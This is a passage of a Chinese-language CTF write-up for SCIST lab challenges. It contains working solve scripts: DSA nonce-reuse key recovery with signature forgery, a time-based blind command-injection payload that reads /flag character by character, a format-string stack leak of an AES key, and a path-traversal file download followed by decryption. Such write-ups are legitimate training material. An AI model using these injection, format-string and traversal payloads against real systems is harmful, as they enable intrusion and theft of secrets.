    g = int(io.recvline().strip())
    io.recvuntil(b"y = ")
    y = int(io.recvline().strip())

    log.info(f"Received parameters: p={p}, q={q}, g={g}, y={y}")

    log.info("Requesting signature for 'AyachiNene' at t=0...")
    io.sendlineafter(b"> ", b"e")
    io.sendlineafter(b"> ", b"a")
    io.recvuntil(b"r = ")
    r0 = int(io.recvline().strip())
    io.recvuntil(b"s = ")
    s0 = int(io.recvline().strip())
    log.info(f"Signature (r0, s0) at t=0: ({r0}, {s0})")

    log.info("Skipping example(1) and example(2) calls to reach t=3...")
    io.sendlineafter(b"> ", b"e")
    io.sendlineafter(b"> ", b"a")
    
    io.sendlineafter(b"> ", b"e")
    io.sendlineafter(b"> ", b"a")

    log.info("Requesting signature for 'AyachiNene' at t=3...")
    io.sendlineafter(b"> ", b"e")
    io.sendlineafter(b"> ", b"a")
    io.recvuntil(b"r = ")
    r3 = int(io.recvline().strip())
    io.recvuntil(b"s = ")
    s3 = int(io.recvline().strip())
    log.info(f"Signature (r3, s3) at t=3: ({r3}, {s3})")

    H_AyachiNene = H(b'AyachiNene')
    log.info(f"H('AyachiNene') = {H_AyachiNene}")

    s0_inv = pow(s0, -1, q)
    s3_inv = pow(s3, -1, q)
    log.info(f"s0_inv = {s0_inv}, s3_inv = {s3_inv}")

    term_x_coeff = (-r0 * s0_inv - r3 * s3_inv) % q
    term_H_const = (H_AyachiNene * (s3_inv + s0_inv)) % q

    log.info(f"Coefficient for x (term_x_coeff): {term_x_coeff}")
    log.info(f"Constant term (term_H_const): {term_H_const}")

    if term_x_coeff == 0:
        log.error("Coefficient for x is zero, which means it's not invertible modulo q. This should ideally not happen.")
        io.close()
        exit(1)

    x = (term_H_const * pow(term_x_coeff, -1, q)) % q
    log.success(f"Recovered private key x = {x}")

    calculated_y = pow(g, x, p)
    if calculated_y == y:
        log.success("Verification successful: g^x % p matches y!")
    else:
        log.error(f"Verification failed: Calculated y ({calculated_y}) does not match public y ({y}).")
        io.close()
        exit(1)

    k0 = (H_AyachiNene + x * r0) % q * s0_inv % q
    log.info(f"Calculated ephemeral key k0 (for t=0) = {k0}")

    H_GET_FLAG = H(b'GET_FLAG')
    log.info(f"H('GET_FLAG') = {H_GET_FLAG}")

    r_flag = pow(g, k0, p) % q
    
    k0_inv = pow(k0, -1, q)
    s_flag = (k0_inv * (H_GET_FLAG + x * r_flag)) % q
    
    log.success(f"Forged signature for 'GET_FLAG': r={r_flag}, s={s_flag}")

    log.info("Submitting forged signature to get the flag...")
    io.sendlineafter(b"> ", b"g")
    io.sendlineafter(b"r: ", str(r_flag).encode())
    io.sendlineafter(b"s: ", str(s_flag).encode())

    io.interactive()

if __name__ == '__main__':
    solve()
```

![image](https://hackmd.io/_uploads/r1PfkfpDll.png)

(基本上crypto都是ai解的)
# Web
## dig-blind2

痾連不到網路? 想起來好像有time based這回事
猜一下flag name
`/flag.txt`
`flag.txt`
`flag` <-開睡
然後就坐等flag出來
```
import requests
import time
import string
from pwn import *
requests.packages.urllib3.disable_warnings()
url = "http://lab.scist.org:31601/"
delay_time = 3
timeout_threshold = delay_time + 1.5
charset = string.ascii_letters + string.digits + "{}_-!@#$&*()" 

flag = ""
for i in range(1, 51):
    found_char_for_pos = False
    for char in charset:
        log.info(f"測試位置 {i}, 字元: '{char}'")
        
        payload = f"x'; if [ \"$(cat /flag | cut -c {i})\" = \"{char}\" ]; then sleep {delay_time}; fi; #"
        
        data = {"name": payload}
        
        start_time = time.time()
        try:
            r = requests.post(url, data=data, timeout=timeout_threshold)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if elapsed_time >= delay_time:
                flag += char
                log.success(f"找到字元: '{char}' 在位置 {i}。當前旗標: {flag}")
                found_char_for_pos = True
                break
            else:
                log.debug(f"位置 {i} 字元 '{char}' 未觸發延遲。耗時: {elapsed_time:.2f} 秒")
        except requests.exceptions.Timeout:
            flag += char
            log.success(f"請求超時，字元 '{char}' 在位置 {i} 很可能是正確的！當前旗標: {flag}")
            found_char_for_pos = True
            break
        except requests.exceptions.RequestException as e:
            log.error(f"請求發生錯誤: {e}")
            log.error("可能網路問題或伺服器關閉，停止猜解。")
            break
    if not found_char_for_pos:
        log.info(f"在位置 {i} 未找到任何字元。假設旗標已全部猜解完成或已結束。")
        break

log.success(f"最終猜解到的旗標: {flag}")
```
![image](https://hackmd.io/_uploads/BkHh4MTDex.png)

# Misc

## MIT license

感覺就是一個patch之後在license就可以拿到flag了
因為不知道怎麼搞所以直接爆破

result:
```
Enter code: patch
src: _Printer__filenames
dst: _MIT__flag
Enter code: license
SCIST{MIT-license_can_readfile!}
```

爆破好耶

## OhYeahmAlwaRe

這分類是想怎樣...![image](https://hackmd.io/_uploads/Syp6_faDxe.png)

然後我要做wp的時候lab掛了
![image](https://hackmd.io/_uploads/SkHy5yRvee.png)
到現在還沒修好 那我就先講我怎麼做的好了

白箱看一下有用一個OhYeahmAlwaRe

![image](https://hackmd.io/_uploads/Syv0qJ0vlx.png)

然後發現path traversal 就可以把那個程式載下來

就可以直接逆他 然後在/version如果帶著author參數訪問的時候就會執行這個
```
 subprocess.run([OhYeahmAlwaRe, author], ...
```
flag好像會經過AES加密的樣子

然後他會把資料base64之後傳出來 就可以leak key

payload:`f"%{i}$p %{i+1}$p %{i+2}$p %{i+3}$p"`

在嘗試多個偏移量之後我們就可以得到完整的key

```
import requests
import base64
from pwn import * # 引入 pwntools，用於 p64/u64 和其他方便的功能

# 設定 pwntools 的架構，這對於處理記憶體位址的位元組序很重要
context.arch = 'amd64' # 根據講義，是 x86-64

# 目標伺服器設定 (請根據實際情況修改 HOST 和 PORT)
HOST = "lab.scist.org"
PORT = 31614
URL_BASE = f"http://{HOST}:{PORT}"
VERSION_ENDPOINT = f"{URL_BASE}/version"

def send_request(endpoint, params):
    """
    發送 GET 請求到指定的端點，並處理 Base64 解碼。
    """
    try:
        r = requests.get(endpoint, params=params)
        r.raise_for_status() # 如果 HTTP 錯誤 (4xx 或 5xx)，則拋出異常
        response_json = r.json()
        if "response" in response_json:
            encoded_output = response_json["response"]
            # Base64 解碼時使用 'latin-1'，因為輸出可能包含非 UTF-8 的原始位元組 (如記憶體位址)
            decoded_output = base64.b64decode(encoded_output).decode('latin-1')
            return decoded_output
        elif "error" in response_json:
            log.error(f"伺服器錯誤: {response_json['error']}")
            return None
        else:
            # 對於非 JSON 回應或除錯
            return r.text
    except requests.exceptions.RequestException as e:
        log.error(f"請求 '{endpoint}' 失敗: {e}")
        return None
    except Exception as e:
        log.error(f"處理響應時發生錯誤: {e}")
        return None

def run_all_payloads_and_decode():
    """
    執行從 %6$p 到 %30$p 的所有潛在金鑰洩露 payload，
    並顯示 Base64 解碼後的結果。
    """
    log.info(f"正在針對 {VERSION_ENDPOINT} 執行所有潛在金鑰洩露 payload...")
    log.info("-" * 50)

    for i in range(6, 31):
        try_payload = f"%{i}$p %{i+1}$p %{i+2}$p %{i+3}$p"
        log.info(f"[*] 嘗試 payload (起始偏移量 ~{i}): '{try_payload}'")

        # 發送請求
        leaked_data_raw = send_request(VERSION_ENDPOINT, {'author': try_payload})

        if leaked_data_raw:
            # 清理輸出，移除 "Powered by " 和換行符
            if leaked_data_raw.startswith("Powered by "):
                cleaned_data = leaked_data_raw[len("Powered by "):].strip()
            else:
                cleaned_data = leaked_data_raw.strip()

            log.success(f"   解碼結果: {cleaned_data}")

            # 嘗試進一步解析，判斷是否為金鑰
            parts = cleaned_data.split(' ')
            if len(parts) == 4 and all(part.startswith('0x') or part == '(nil)' for part in parts):
                potential_key_bytes_list = []
                all_parts_valid = True
                for p in parts:
                    try:
                        # 將十六進位字串轉換為 64 位元整數，再轉換為小端序的 8 位元組
                        if p == '(nil)':
                            potential_key_bytes_list.append(p64(0))
                        else:
                            potential_key_bytes_list.append(p64(int(p, 16)))
                    except ValueError:
                        all_parts_valid = False
                        break
                
                if all_parts_valid:
                    potential_key_bytes = b"".join(potential_key_bytes_list)
                    if len(potential_key_bytes) == 32:
                        log.info(f"   組合為 32 位元組金鑰 (Hex): {potential_key_bytes.hex()}")
                        try:
                            log.info(f"   組合為 32 位元組金鑰 (ASCII/Raw): {potential_key_bytes.decode('ascii')}")
                        except UnicodeDecodeError:
                            log.info(f"   金鑰包含非 ASCII 字元。")
                else:
                    log.warning(f"   無法解析所有十六進位部分。")
            else:
                log.info(f"   未形成標準的 4 個 QWORD 格式。")
        else:
            log.error(f"   無法取得堆疊數據。")
        
        log.info("-" * 50)

    log.info("[*] 所有指定的 payload 已經執行完畢。")

if __name__ == "__main__":
    log.level = 'info' # 設置日誌級別，可以改為 'debug' 看到更多細節
    run_all_payloads_and_decode()
```

然後就可以把key拿去解密了
```
import requests
from pwn import *
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


# 設定目標主機和端口
HOST = "lab.scist.org"
PORT = 31614
URL_BASE = f"http://{HOST}:{PORT}"
IMAGE_ENDPOINT = f"{URL_BASE}/hacker_image"

# 從之前格式化字串漏洞洩露的金鑰 (十六進位字串形式)
LEAKED_KEY_HEX = "5bd90f2bde67c7c133419f87d78a578d9862ba7f135cca573e6ac09bb0390e35"
LEAKED_KEY_BYTES = bytes.fromhex(LEAKED_KEY_HEX)

def send_request_raw(endpoint, params):
    try:
        r = requests.get(endpoint, params=params, timeout=5)
        r.raise_for_status()
        return r.content
    except requests.exceptions.RequestException as e:
        log.error(f"請求 '{endpoint}' 失敗: {e}")
        return None

def decrypt_aes_256_ecb(ciphertext, key):
    try:
        cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
        decryptor = cipher.decryptor()
        
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        plaintext = padded_plaintext.rstrip(b'\x00')
        
        return plaintext
    except Exception as e:
        log.warning(f"AES-256-ECB 解密失敗: {e}")
        return None

def main():
    log.level = 'debug'

    # 下載加密的旗標檔案內容
    flag_path_payload = "../../../../home/flag.txt"
    encrypted_flag_content = send_request_raw(IMAGE_ENDPOINT, {'hacker': flag_path_payload})

    if not encrypted_flag_content:
        log.error("無法下載加密的旗標檔案內容。")
        return

    log.success(f"成功下載 {len(encrypted_flag_content)} 位元組的加密旗標內容。")

    # 解密旗標
    decrypted_flag = decrypt_aes_256_ecb(encrypted_flag_content, LEAKED_KEY_BYTES)

    if decrypted_flag:
        log.success(f"旗標: {decrypted_flag.decode('utf-8', errors='ignore')}")
    else:
        log.error("解密失敗。")

if __name__ == "__main__":
    main()
```